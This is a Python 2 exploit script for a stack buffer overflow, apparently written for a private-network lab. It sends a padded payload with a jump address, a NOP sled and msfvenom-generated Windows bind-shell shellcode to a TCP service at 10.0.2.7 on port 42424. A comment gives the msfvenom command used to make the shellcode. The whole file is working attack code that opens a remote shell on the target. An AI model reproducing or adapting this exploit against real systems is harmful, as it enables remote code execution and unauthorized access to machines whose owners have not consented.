#!/usr/bin/env python2
import socket

target_host = "10.0.2.7"
target_port = 42424
jmp = "\xc3\x14\x04\x08"
nops = "\x90" * 15 

# 08-03-2020 DC:  I created this shellcode with the following command:
# msfvenom -p windows/shell_bind_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0A"

shellcode = (
"\xda\xcd\xd9\x74\x24\xf4\xbf\x44\xdc\xa2\x3e\x5d\x29\xc9\xb1"
"\x53\x31\x7d\x17\x83\xc5\x04\x03\x39\xcf\x40\xcb\x3d\x07\x06"
"\x34\xbd\xd8\x67\xbc\x58\xe9\xa7\xda\x29\x5a\x18\xa8\x7f\x57"
"\xd3\xfc\x6b\xec\x91\x28\x9c\x45\x1f\x0f\x93\x56\x0c\x73\xb2"
"\xd4\x4f\xa0\x14\xe4\x9f\xb5\x55\x21\xfd\x34\x07\xfa\x89\xeb"
"\xb7\x8f\xc4\x37\x3c\xc3\xc9\x3f\xa1\x94\xe8\x6e\x74\xae\xb2"
"\xb0\x77\x63\xcf\xf8\x6f\x60\xea\xb3\x04\x52\x80\x45\xcc\xaa"
"\x69\xe9\x31\x03\x98\xf3\x76\xa4\x43\x86\x8e\xd6\xfe\x91\x55"
"\xa4\x24\x17\x4d\x0e\xae\x8f\xa9\xae\x63\x49\x3a\xbc\xc8\x1d"
"\x64\xa1\xcf\xf2\x1f\xdd\x44\xf5\xcf\x57\x1e\xd2\xcb\x3c\xc4"
"\x7b\x4a\x99\xab\x84\x8c\x42\x13\x21\xc7\x6f\x40\x58\x8a\xe7"
"\xa5\x51\x34\xf8\xa1\xe2\x47\xca\x6e\x59\xcf\x66\xe6\x47\x08"
"\x88\xdd\x30\x86\x77\xde\x40\x8f\xb3\x8a\x10\xa7\x12\xb3\xfa"
"\x37\x9a\x66\x96\x3f\x3d\xd9\x85\xc2\xfd\x89\x09\x6c\x96\xc3"
"\x85\x53\x86\xeb\x4f\xfc\x2f\x16\x70\x13\xec\x9f\x96\x79\x1c"
"\xf6\x01\x15\xde\x2d\x9a\x82\x21\x04\xb2\x24\x69\x4e\x05\x4b"
"\x6a\x44\x21\xdb\xe1\x8b\xf5\xfa\xf5\x81\x5d\x6b\x61\x5f\x0c"
"\xde\x13\x60\x05\x88\xb0\xf3\xc2\x48\xbe\xef\x5c\x1f\x97\xde"
"\x94\xf5\x05\x78\x0f\xeb\xd7\x1c\x68\xaf\x03\xdd\x77\x2e\xc1"
"\x59\x5c\x20\x1f\x61\xd8\x14\xcf\x34\xb6\xc2\xa9\xee\x78\xbc"
"\x63\x5c\xd3\x28\xf5\xae\xe4\x2e\xfa\xfa\x92\xce\x4b\x53\xe3"
"\xf1\x64\x33\xe3\x8a\x98\xa3\x0c\x41\x19\xc3\xee\x43\x54\x6c"
"\xb7\x06\xd5\xf1\x48\xfd\x1a\x0c\xcb\xf7\xe2\xeb\xd3\x72\xe6"
"\xb0\x53\x6f\x9a\xa9\x31\x8f\x09\xc9\x13")


payload = "A" * 146 + jmp + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))

s.send(payload + "\r\n")
s.close()
